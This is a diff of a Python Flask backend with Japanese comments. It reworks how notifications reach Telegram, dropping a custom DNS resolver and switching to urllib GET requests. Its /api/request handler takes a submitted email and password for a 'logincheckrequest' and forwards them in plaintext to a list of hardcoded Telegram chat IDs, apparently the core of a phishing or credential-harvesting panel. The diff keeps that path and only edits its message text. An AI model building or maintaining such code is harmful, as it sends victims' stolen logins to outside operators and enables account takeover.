@@ -14,34 +14,8 @@ import os
 import sqlite3
 import uuid
 import threading
-import socket
-
-try:
-    import dns.resolver
-    
-    original_getaddrinfo = socket.getaddrinfo
-    
-    def custom_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
-        if host == 'api.telegram.org':
-            try:
-                resolver = dns.resolver.Resolver()
-                resolver.nameservers = ['8.8.8.8', '8.8.4.4']
-                resolver.timeout = 5
-                resolver.lifetime = 5
-                answers = resolver.resolve(host, 'A')
-                ip = str(answers[0])
-                print(f"[INFO] DNS解決成功: {host} -> {ip}")
-                return original_getaddrinfo(ip, port, family, type, proto, flags)
-            except Exception as e:
-                print(f"[WARN] カスタムDNS解決失敗: {e}, デフォルトにフォールバック")
-        return original_getaddrinfo(host, port, family, type, proto, flags)
-    
-    socket.getaddrinfo = custom_getaddrinfo
-    print("[INFO] Google DNSリゾルバ設定完了")
-except ImportError:
-    print("[WARN] dnspythonが未インストール、通常のDNS解決を使用")
-
-socket.setdefaulttimeout(30)
+import urllib.request
+import urllib.parse
 
 logging.basicConfig(level=logging.INFO)
 
@@ -64,21 +38,26 @@ TELEGRAM_CHAT_IDS = os.getenv('TELEGRAM_CHAT_IDS', '8204394801,8303180774,824356
 # ===========================
 
 def send_telegram_notification(message):
-    """Telegram通知送信（非同期）"""
+    """Telegram通知送信（urllib使用）"""
     def _send():
         for chat_id in TELEGRAM_CHAT_IDS:
             try:
-                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-                payload = {
+                # URLパラメータ方式でGETリクエスト
+                params = urllib.parse.urlencode({
                     'chat_id': chat_id.strip(),
                     'text': message,
                     'parse_mode': 'HTML'
-                }
-                response = requests.post(url, json=payload, timeout=30)
-                if response.status_code == 200:
-                    print(f"[INFO] Telegram通知送信成功: {chat_id}")
-                else:
-                    print(f"[ERROR] Telegram通知送信失敗: {chat_id} - {response.text}")
+                })
+                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage?{params}"
+                
+                req = urllib.request.Request(url, method='GET')
+                with urllib.request.urlopen(req, timeout=30) as response:
+                    result = json.loads(response.read().decode())
+                    if result.get('ok'):
+                        print(f"[INFO] Telegram通知送信成功: {chat_id}")
+                    else:
+                        print(f"[ERROR] Telegram通知送信失敗: {chat_id} - {result}")
+                        
             except Exception as e:
                 print(f"[ERROR] Telegram通知エラー: {chat_id} - {e}")
     
@@ -482,11 +461,19 @@ def index():
 def test_telegram():
     """Telegram送信テスト"""
     try:
-        import socket
-        ip = socket.gethostbyname('api.telegram.org')
-        return f"DNS解決成功: api.telegram.org -> {ip}"
+        params = urllib.parse.urlencode({
+            'chat_id': TELEGRAM_CHAT_IDS[0],
+            'text': 'テストメッセージ from Render'
+        })
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage?{params}"
+        
+        req = urllib.request.Request(url, method='GET')
+        with urllib.request.urlopen(req, timeout=30) as response:
+            result = json.loads(response.read().decode())
+            return jsonify(result)
+            
     except Exception as e:
-        return f"DNS解決失敗: {e}"
+        return f"エラー: {e}"
 
 @app.route('/api/request', methods=['POST'])
 def create_request_endpoint():
@@ -505,7 +492,7 @@ def create_request_endpoint():
         if genre == 'logincheckrequest' and request_data:
             email = request_data.get('email', '不明')
             password = request_data.get('password', '不明')
-            message = f"<b>ログインリクエスト通知が来ました</b>\n\nメアド：{email}\nパスワード：{password}"
+            message = f"ログインリクエスト通知が来ました\n\nメアド：{email}\nパスワード：{password}"
             send_telegram_notification(message)
         
         return jsonify({
@@ -840,24 +827,6 @@ def api_admin_block_delete():
 # ===========================
 
 init_db()
-
-def warmup_telegram_dns():
-    """起動時にTelegram APIのDNS解決をキャッシュ"""
-    def _warmup():
-        try:
-            print("[INFO] Telegram API DNS解決をウォームアップ中...")
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe"
-            response = requests.get(url, timeout=60)
-            if response.status_code == 200:
-                print("[INFO] Telegram API DNS解決完了")
-            else:
-                print(f"[WARN] Telegram APIウォームアップ失敗: {response.status_code}")
-        except Exception as e:
-            print(f"[WARN] Telegram APIウォームアップエラー: {e}")
-    
-    threading.Thread(target=_warmup, daemon=True).start()
-
-warmup_telegram_dns()
 
 scheduler = BackgroundScheduler()
 
